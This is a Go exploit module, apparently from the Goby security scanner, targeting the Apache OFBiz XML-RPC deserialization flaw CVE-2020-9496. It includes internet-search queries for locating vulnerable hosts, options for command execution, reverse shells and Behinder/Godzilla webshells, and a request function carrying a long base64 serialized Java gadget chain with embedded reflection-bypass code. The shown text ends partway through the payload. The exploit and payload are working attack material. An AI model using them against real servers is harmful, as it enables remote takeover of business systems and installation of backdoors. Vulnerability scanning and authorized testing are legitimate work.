package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache OFBiz webtools/control/xmlrpc remote code execution vulnerability (CVE-2020-9496)",
    "Description": "<p>Apache OFBiz is an open source enterprise resource planning (ERP) system that provides a variety of business functions and modules.</p><p>Apache OFBiz has a deserialization code execution vulnerability in webtools/control/xmlrpc. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Apache_OFBiz",
    "Homepage": "http://ofbiz.apache.org/",
    "DisclosureDate": "2020-07-15",
    "PostTime": "2023-12-27",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "GobyQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "Level": "3",
    "Impact": "<p>Apache OFBiz has a deserialization code execution vulnerability in webtools/control/xmlrpc. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://ofbiz.apache.org/security.html\">https://ofbiz.apache.org/security.html</a></p>",
    "References": [
        "https://ofbiz.apache.org/security.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-9496"
    ],
    "CNNVD": [
        "CNNVD-202007-1041"
    ],
    "CNVD": [
        "CNVD-2020-44091"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apache OFBiz webtools/control/xmlrpc 远程代码执行漏洞（CVE-2020-9496）",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz 是一个开源的企业资源规划（ERP）系统，提供了多种商业功能和模块。<br></p><p>Apache OFBiz 在 webtools/control/xmlrpc 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时更新升级：<a href=\"https://ofbiz.apache.org/security.html\" target=\"_blank\">https://ofbiz.apache.org/security.html</a><br></p>",
            "Impact": "<p>Apache OFBiz 在 webtools/control/xmlrpc 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache OFBiz webtools/control/xmlrpc remote code execution vulnerability (CVE-2020-9496)",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz is an open source enterprise resource planning (ERP) system that provides a variety of business functions and modules.</p><p>Apache OFBiz has a deserialization code execution vulnerability in webtools/control/xmlrpc. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://ofbiz.apache.org/security.html\" target=\"_blank\">https://ofbiz.apache.org/security.html</a><br></p>",
            "Impact": "<p>Apache OFBiz has a deserialization code execution vulnerability in webtools/control/xmlrpc. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10890"
}`

	sendPayloadFlag91rqTc := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/webtools/control/xmlrpc`)
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.Header.Store(`Accept-Encoding`, `deflate, identity, br`)
		payloadRequestConfig.Header.Store(`Content-Type`, `application/xml`)
		payloadRequestConfig.Header.Store("cmd", cmd)
		payloadRequestConfig.Data = `<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAMfHK/rq+AAAAMQAtCgALABsKAAwAHAkACwAdBwAeCgAEABwIAB8KAAQAIAgAIQsAIgAjBwAkBwAlBwAmAQAGZXhlY09rAQABWgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEABGV4ZWMBAApTb3VyY2VGaWxlAQAIVFQxLmphdmEMABgAFwwAFgAXDAANAA4BACBqYXZheC9zY3JpcHQvU2NyaXB0RW5naW5lTWFuYWdlcgEAAmpzDAAoACkBLXV0cnl7bG9hZCgibmFzaG9ybjptb3ppbGxhX2NvbXBhdC5qcyIpfWNhdGNoKEEpe31mdW5jdGlvbiBnZXRVbnNhZmUoKXt2YXIgQT1qYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuVW5zYWZlIikuZ2V0RGVjbGFyZWRGaWVsZCgidGhlVW5zYWZlIik7cmV0dXJuIEEuc2V0QWNjZXNzaWJsZSghMCksQS5nZXQobnVsbCl9ZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShBKXt2YXIgQj1nZXRVbnNhZmUoKSxhPUIuZGVmaW5lQW5vbnltb3VzQ2xhc3MoQSxqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzIikuZ2V0UmVzb3VyY2VBc1N0cmVhbSgiQ2xhc3MuY2xhc3MiKS5yZWFkQWxsQnl0ZXMoKSxudWxsKS5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpO0IucHV0T2JqZWN0KEEsQi5vYmplY3RGaWVsZE9mZnNldChhKSxudWxsKX1mdW5jdGlvbiBieXBhc3NSZWZsZWN0aW9uRmlsdGVyKCl7dmFyIEE7dHJ5e0E9amF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKX1jYXRjaChCKXtBPWphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ucmVmbGVjdC5SZWZsZWN0aW9uIil9dmFyIEI9Z2V0VW5zYWZlKCksYT1BLmdldFJlc291cmNlQXNTdHJlYW0oIlJlZmxlY3Rpb24uY2xhc3MiKS5yZWFkQWxsQnl0ZXMoKSxlPUIuZGVmaW5lQW5vbnltb3VzQ2xhc3MoQSxhLG51bGwpLGM9ZS5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpLGw9ZS5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTtjLmdldFR5cGUoKS5pc0Fzc2lnbmFibGVGcm9tKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpKSYmQi5wdXRPYmplY3QoQSxCLnN0YXRpY0ZpZWxkT2Zmc2V0KGMpLGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSksbC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkmJkIucHV0T2JqZWN0KEEsQi5zdGF0aWNGaWVsZE9mZnNldChsKSxqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpLHJlbW92ZUNsYXNzQ2FjaGUoamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5DbGFzcyIpKX1mdW5jdGlvbiBzZXRBY2Nlc3NpYmxlKEEpe3ZhciBCPWdldFVuc2FmZSgpLGE9amF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpLGU9Qi5vYmplY3RGaWVsZE9mZnNldChhKTtCLnB1dEJvb2xlYW4oQSxlLCEwKX1mdW5jdGlvbiBkZWZpbmVDbGFzcyhBKXt2YXIgQj1udWxsLGE9amF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIiksZT1nZXRVbnNhZmUoKSxjPW5ldyBqYXZhLm5ldC5VUkxDbGFzc0xvYWRlcihqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5uZXQuVVJMIiksMCkpO3RyeXtpZihhLnNwbGl0KCIuIilbMF0+PTExKWJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSxkZWZpbmVDbGFzc01ldGhvZD1qYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIixqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiW0IiKSxqYXZhLmxhbmcuSW50ZWdlci5UWVBFLGphdmEubGFuZy5JbnRlZ2VyLlRZUEUpLHNldEFjY2Vzc2libGUoZGVmaW5lQ2xhc3NNZXRob2QpLEI9ZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGMsQSwwLEEubGVuZ3RoKTtlbHNle3ZhciBsPW5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydGlmaWNhdGUiKSwwKSksbnVsbCxjLFtdKTtCPWUuZGVmaW5lQ2xhc3MobnVsbCxBLDAsQS5sZW5ndGgsYyxsKX19Y2F0Y2goQSl7QS5wcmludFN0YWNrVHJhY2UoKX1maW5hbGx5e3JldHVybiBCfX1mdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoQSl7dmFyIEI7dHJ5e0I9amF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKS5uZXdJbnN0YW5jZSgpLmRlY29kZUJ1ZmZlcihBKX1jYXRjaChhKXtCPWphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKEEpfXJldHVybiBCfXZhciBjb2RlPSJ5djY2dmdBQUFERUJqd29BSGdDbkNnQkRBS2dLQUVNQXFRb0FIZ0NxQ0FDckNnQWNBS3dLQUswQXJnb0FyUUN2QndDd0NnQkRBTEVJQUo4S0FDRUFzZ2dBc3dnQXRBY0F0UWdBdGdnQXR3Y0F1QW9BSEFDNUNBQzZDQUM3QndDOEN3QVdBTDBMQUw0QXZ3c0F2Z0RBQ0FEQkNBRENCd0REQ2dBY0FNUUhBTVVLQU1ZQXh3Z0F5QWNBeVFnQXlnb0FqQURMQ2dBaEFNd0lBTTBKQU00QXp3b0F6Z0RRQ0FEUkNnQ01BTklLQUJ3QTB3Z0ExQWNBMVFvQUhBRFdDQURYQndEWUNBRFpDQURhQ2dBY0FOc0hBTndLQUVNQTNRb0EzZ0RTQ0FEZkNnQWhBT0FJQU9FS0FDRUE0Z2dBNHdvQUlRRGtDZ0NNQU9VSUFPWUtBQ0VBNXdnQTZBa0FqQURwQ2dET0FPb0pBSXdBNndjQTdBb0FRd0R0Q2dCREFPNElBS0FJQU84SUFQQUtBSXdBOFFnQThnb0FqQUR6QndEMENnQk1BUFVIQVBZS0FFNEE5d29BakFENENnQk9BUGtLQUU0QStnb0FUZ0Q3Q2dBdkFQd0tBRXdBL1FvQUlRRCtDQUQvQ2dFQUFRRUtBQ0VCQWdnQkF3Z0JCQWdCQlFjQkJnb0FYUUNuQ2dCZEFRY0lBUWdLQUYwQS9BZ0JDUWdCQ2dnQkN3Z0JEQW9CRFFFT0NnRU5BUThIQVJBS0FSRUJFZ29BYUFFVENBRVVDZ0JvQVJVS0FHZ0F2d29BYUFFV0NnRVJBUmNLQVJFQkdBZ0JHUWdCR2dvQkRRRWJCd0VjQ2dCMEFSMEtBSFFCRWdvQkVRRWVDZ0IwQVI0S0FIUUJId29CSUFFaENnRWdBU0lLQVNNQkpBb0JJd0Q2QlFBQUFBQUFBQUF5Q2dCREFTVUtBUkVCSmdvQWRBRDdDZ0F2QVNjS0FNNEJLQW9BakFFcENBRXFDQUVyQ0FFc0NBRXRDQUNqQ0FFdUJ3RXZBUUFDYVhBQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3YjNKMEFRQVRUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPd0VBQmp4cGJtbDBQZ0VBQXlncFZnRUFCRU52WkdVQkFBOU1hVzVsVG5WdFltVnlWR0ZpYkdVQkFBcEZlR05sY0hScGIyNXpBUUFKYkc5aFpFTnNZWE56QVFBbEtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFDVk5wWjI1aGRIVnlaUUVBS0NoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3p3cVBqc0JBQVZ3Y205NGVRRUFKaWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRmQzSnBkR1VCQURnb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFDbU5zWldGeVVHRnlZVzBCQUFSbGVHVmpBUUFIY21WMlpYSnpaUUVBRmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0SktWWUJBQU55ZFc0QkFBWmtaV052WkdVQkFCWW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVnRDQVFBS1UyOTFjbU5sUm1sc1pRRUFCMEUwTG1waGRtRU1BSkVBa2d3Qk1BRXhEQUV5QVRNTUFUUUJOUUVBQjNSb2NtVmhaSE1NQVRZQk53Y0JPQXdCT1FFNkRBRTdBVHdCQUJOYlRHcGhkbUV2YkdGdVp5OVVhSEpsWVdRN0RBRTlBVDRNQVQ4QlFBRUFCR2gwZEhBQkFBWjBZWEpuWlhRQkFCSnFZWFpoTDJ4aGJtY3ZVblZ1Ym1GaWJHVUJBQVowYUdsekpEQUJBQWRvWVc1a2JHVnlBUUFlYW1GMllTOXNZVzVuTDA1dlUzVmphRVpwWld4a1JYaGpaWEIwYVc5dURBRkJBVFVCQUFabmJHOWlZV3dCQUFwd2NtOWpaWE56YjNKekFRQU9hbUYyWVM5MWRHbHNMMHhwYzNRTUFVSUJRd2NCUkF3QlJRRkdEQUZIQVVnQkFBTnlaWEVCQUF0blpYUlNaWE53YjI1elpRRUFEMnBoZG1FdmJHRnVaeTlEYkdGemN3d0JTUUZLQVFBUWFtRjJZUzlzWVc1bkwwOWlhbVZqZEFjQlN3d0JUQUZOQVFBSloyVjBTR1ZoWkdWeUFRQVFhbUYyWVM5c1lXNW5MMU4wY21sdVp3RUFBMk50WkF3QW1nQ2JEQUZPQVU4QkFBbHpaWFJUZEdGMGRYTUhBVkFNQVZFQlVnd0JVd0ZVQVFBa2IzSm5MbUZ3WVdOb1pTNTBiMjFqWVhRdWRYUnBiQzVpZFdZdVFubDBaVU5vZFc1ckRBQ1dBSmNNQVZVQlNBRUFDSE5sZEVKNWRHVnpBUUFDVzBJTUFWWUJTZ0VBQjJSdlYzSnBkR1VCQUJOcVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dUFRQVRhbUYyWVM1dWFXOHVRbmwwWlVKMVptWmxjZ0VBQkhkeVlYQU1BVmNBbHdFQUlHcGhkbUV2YkdGdVp5OURiR0Z6YzA1dmRFWnZkVzVrUlhoalpYQjBhVzl1REFGWUFWa0hBVm9CQUFBTUFWc0JYQUVBRUdOdmJXMWhibVFnYm05MElHNTFiR3dNQVYwQlBnRUFCU01qSXlNakRBRmVBVjhNQUo0QW13RUFBVG9NQVdBQllRRUFJbU52YlcxaGJtUWdjbVYyWlhKelpTQm9iM04wSUdadmNtMWhkQ0JsY25KdmNpRU1BSTBBamd3QllnRmpEQUNQQUpBQkFCQnFZWFpoTDJ4aGJtY3ZWR2h5WldGa0RBQ1JBV1FNQVdVQWtnRUFCU1FrSkNRa0FRQVNabWxzWlNCbWIzSnRZWFFnWlhKeWIzSWhEQUNjQUowQkFBVkFRRUJBUUF3QW53Q2JBUUFNYW1GMllTOXBieTlHYVd4bERBQ1JBV1lCQUJocVlYWmhMMmx2TDBacGJHVlBkWFJ3ZFhSVGRISmxZVzBNQUpFQlp3d0Fvd0NrREFDY0FXZ01BV2tBa2d3QmFnQ1NEQUZyQVQ0TUFXd0JQZ3dCYlFGdUFRQUhiM011Ym1GdFpRY0Jid3dCY0FDYkRBRnhBVDRCQUFOM2FXNEJBQVJ3YVc1bkFRQUNMVzRCQUJkcVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjZ3dCY2dGekFRQUZJQzF1SURRQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NCZEF3QmRRRjJEQUNmQVhjQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0JlQXdCZVFGNkRBQ1JBWHNCQUFKY1lRd0JmQUY5REFGSEFUNE1BWDRCZWd3QmZ3Q1NBUUFITDJKcGJpOXphQUVBQjJOdFpDNWxlR1VNQUo4QmdBRUFEMnBoZG1FdmJtVjBMMU52WTJ0bGRBd0FrUUNoREFHQkFZSU1BWU1CUmdjQmhBd0JoUUdHREFHSEFZWUhBWWdNQUp3QmlRd0JpZ0dMREFHTUFZWU1BWTBCUGd3QmpnR0dEQUNnQUtFQkFCWnpkVzR1Yldsell5NUNRVk5GTmpSRVpXTnZaR1Z5QVFBTVpHVmpiMlJsUW5WbVptVnlBUUFRYW1GMllTNTFkR2xzTGtKaGMyVTJOQUVBQ21kbGRFUmxZMjlrWlhJQkFDWnZjbWN1WVhCaFkyaGxMbU52YlcxdmJuTXVZMjlrWldNdVltbHVZWEo1TGtKaGMyVTJOQUVBQWtFMEFRQU5ZM1Z5Y21WdWRGUm9jbVZoWkFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlVYUhKbFlXUTdBUUFPWjJWMFZHaHlaV0ZrUjNKdmRYQUJBQmtvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrUjNKdmRYQTdBUUFJWjJWMFEyeGhjM01CQUJNb0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQVFaMlYwUkdWamJHRnlaV1JHYVdWc1pBRUFMU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtPd0VBRjJwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtBUUFOYzJWMFFXTmpaWE56YVdKc1pRRUFCQ2hhS1ZZQkFBTm5aWFFCQUNZb1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFCMmRsZEU1aGJXVUJBQlFvS1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUNHTnZiblJoYVc1ekFRQWJLRXhxWVhaaEwyeGhibWN2UTJoaGNsTmxjWFZsYm1ObE95bGFBUUFOWjJWMFUzVndaWEpqYkdGemN3RUFDR2wwWlhKaGRHOXlBUUFXS0NsTWFtRjJZUzkxZEdsc0wwbDBaWEpoZEc5eU93RUFFbXBoZG1FdmRYUnBiQzlKZEdWeVlYUnZjZ0VBQjJoaGMwNWxlSFFCQUFNb0tWb0JBQVJ1WlhoMEFRQVVLQ2xNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFsblpYUk5aWFJvYjJRQkFFQW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdXMHhxWVhaaEwyeGhibWN2UTJ4aGMzTTdLVXhxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlOWlhSb2IyUTdBUUFZYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2VFdWMGFHOWtBUUFHYVc1MmIydGxBUUE1S0V4cVlYWmhMMnhoYm1jdlQySnFaV04wTzF0TWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUlaMlYwUW5sMFpYTUJBQVFvS1Z0Q0FRQVJhbUYyWVM5c1lXNW5MMGx1ZEdWblpYSUJBQVJVV1ZCRkFRQVJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWQyWVd4MVpVOW1BUUFXS0VrcFRHcGhkbUV2YkdGdVp5OUpiblJsWjJWeU93RUFDMjVsZDBsdWMzUmhibU5sQVFBUloyVjBSR1ZqYkdGeVpXUk5aWFJvYjJRQkFBZG1iM0pPWVcxbEFRQVZaMlYwUTI5dWRHVjRkRU5zWVhOelRHOWhaR1Z5QVFBWktDbE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBQm1WeGRXRnNjd0VBRlNoTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzcFdnRUFCSFJ5YVcwQkFBcHpkR0Z5ZEhOWGFYUm9BUUFWS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsYUFRQUZjM0JzYVhRQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVnRNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFod1lYSnpaVWx1ZEFFQUZTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BTUUVBRnloTWFtRjJZUzlzWVc1bkwxSjFibTVoWW14bE95bFdBUUFGYzNSaGNuUUJBQlVvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFCRW9UR3BoZG1FdmFXOHZSbWxzWlRzcFZnRUFCU2hiUWlsV0FRQUZabXgxYzJnQkFBVmpiRzl6WlFFQUNIUnZVM1J5YVc1bkFRQVBaMlYwUVdKemIyeDFkR1ZRWVhSb0FRQUhjbVZ3YkdGalpRRUFSQ2hNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUdE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQVFhbUYyWVM5c1lXNW5MMU41YzNSbGJRRUFDMmRsZEZCeWIzQmxjblI1QVFBTGRHOU1iM2RsY2tOaGMyVUJBQVpoY0hCbGJtUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUJGcVlYWmhMMnhoYm1jdlVuVnVkR2x0WlFFQUNtZGxkRkoxYm5ScGJXVUJBQlVvS1V4cVlYWmhMMnhoYm1jdlVuVnVkR2x0WlRzQkFDZ29XMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFCeWIyTmxjM003QVFBUmFtRjJZUzlzWVc1bkwxQnliMk5sYzNNQkFBNW5aWFJKYm5CMWRGTjBjbVZoYlFFQUZ5Z3BUR3BoZG1FdmFXOHZTVzV3ZFhSVGRISmxZVzA3QVFBWUtFeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPeWxXQVFBTWRYTmxSR1ZzYVcxcGRHVnlBUUFuS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzkxZEdsc0wxTmpZVzV1WlhJN0FRQU9aMlYwUlhKeWIzSlRkSEpsWVcwQkFBZGtaWE4wY205NUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFCeWIyTmxjM003QVFBUFoyVjBUM1YwY0hWMFUzUnlaV0Z0QVFBWUtDbE1hbUYyWVM5cGJ5OVBkWFJ3ZFhSVGRISmxZVzA3QVFBSWFYTkRiRzl6WldRQkFCTnFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRBUUFKWVhaaGFXeGhZbXhsQVFBREtDbEpBUUFFY21WaFpBRUFGR3BoZG1FdmFXOHZUM1YwY0hWMFUzUnlaV0Z0QVFBRUtFa3BWZ0VBQlhOc1pXVndB